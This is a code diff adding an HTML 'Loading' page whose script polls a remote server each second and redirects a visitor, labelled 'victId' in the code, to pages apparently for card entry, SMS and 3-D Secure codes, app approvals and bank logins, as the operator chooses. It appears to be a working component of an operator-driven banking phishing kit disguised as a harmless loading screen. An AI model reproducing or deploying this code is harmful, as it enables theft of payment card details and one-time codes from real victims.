@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading</title>
+</head>
+<body>
+<div class="row brand" style="margin-top: 250px;">
+    <div style="width: 100px;margin: 0 auto;">
+        <img src="img/processing.gif" alt="" width="100" height="100">
+    </div>
+</div>
+<script src="script.js"></script>
+
+<script>
+var urlweb = window.location.href;
+var params = (new URL(urlweb)).searchParams;
+var idValue = params.get('id');
+
+var linkOpened = false; 
+
+function fetchData() {
+  if (!linkOpened) {
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        const victId = idValue;
+
+        if (data.user[victId].CC === "true") {
+          window.location.href = "cc.html";
+          linkOpened = true; 
+        } else if (data.user[victId].CODE2 === "true") {
+          window.location.href = "code2.html?id=" + victId;
+          linkOpened = true;
+        } else if (data.user[victId].SMS === "true") {
+          window.location.href = "ACS.htm?id=" + victId;
+          linkOpened = true;
+        } else if (data.user[victId].APP === "true") {
+          window.location.href = "app.html?id=" + victId;
+          linkOpened = true;
+        } else if (data.user[victId].APPNO === "true") {
+          window.location.href = "appno.html?id=" + victId;
+          linkOpened = true;
+        } else if (data.user[victId].SITE === "true") {
+          window.location.href = urlsite;
+          linkOpened = true;
+        } else if (data.user[victId].BANK === "true") {
+          window.location.href = "ACS2.html?id=" + victId;
+          linkOpened = true;
+        }
+      })
+      .catch(error => {
+        console.error('Error fetching data:', error);
+      });
+  }
+}
+
+setInterval(fetchData, 1000);
+
+</script>
+
+
+</body>
+</html>
